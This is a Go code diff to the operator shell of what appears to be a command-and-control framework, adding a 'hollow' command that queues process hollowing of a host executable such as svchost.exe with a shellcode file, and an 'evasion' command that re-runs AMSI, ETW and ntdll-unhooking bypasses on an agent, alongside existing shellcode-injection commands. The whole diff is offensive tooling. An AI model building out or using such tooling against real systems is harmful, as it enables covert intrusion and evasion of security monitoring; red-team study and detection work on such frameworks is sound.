@@ -161,6 +161,10 @@ func (sh *Shell) executeAgentCmd(cmd string, args []string) {
 		sh.cmdShellcode(args)
 	case "inject":
 		sh.cmdInject(args)
+	case "hollow":
+		sh.cmdHollow(args)
+	case "evasion":
+		sh.cmdEvasion()
 	default:
 		// Check if it's an AD command
 		if strings.HasPrefix(cmd, "ad-") {
@@ -581,6 +585,8 @@ func (sh *Shell) cmdAgentHelp() {
 		{"bof <file> [args]", "Execute Beacon Object File (in-memory)"},
 		{"shellcode <file>", "Execute raw shellcode in-memory"},
 		{"inject <pid> <file>", "Inject shellcode into remote process"},
+		{"hollow <exe> <file>", "Process hollowing (spawn + inject)"},
+		{"evasion", "Re-run evasion (AMSI/ETW/unhook)"},
 		{"ad-*", "Active Directory commands (type 'ad-help')"},
 		{"back", "Return to main menu"},
 	}
@@ -789,6 +795,29 @@ func (sh *Shell) cmdInject(args []string) {
 
 	sh.queueTask(protocol.TaskInject, []string{args[0]}, data)
 	Info("Injecting %d bytes into PID %s", len(data), args[0])
+}
+
+func (sh *Shell) cmdHollow(args []string) {
+	if len(args) < 2 {
+		Error("Usage: hollow <host-exe> <shellcode-file>")
+		Info("Example: hollow C:\\Windows\\System32\\svchost.exe /path/to/payload.bin")
+		Info("Spawns the host process suspended, injects payload, and resumes")
+		return
+	}
+
+	data, err := os.ReadFile(args[1])
+	if err != nil {
+		Error("Failed to read shellcode file: %v", err)
+		return
+	}
+
+	sh.queueTask(protocol.TaskHollow, []string{args[0]}, data)
+	Info("Hollowing %s with %d bytes payload", args[0], len(data))
+}
+
+func (sh *Shell) cmdEvasion() {
+	Info("Re-running evasion techniques on agent (AMSI, ETW, ntdll unhook)...")
+	sh.queueTask(protocol.TaskEvasion, nil, nil)
 }
 
 func (sh *Shell) cmdAD(cmd string, args []string) {
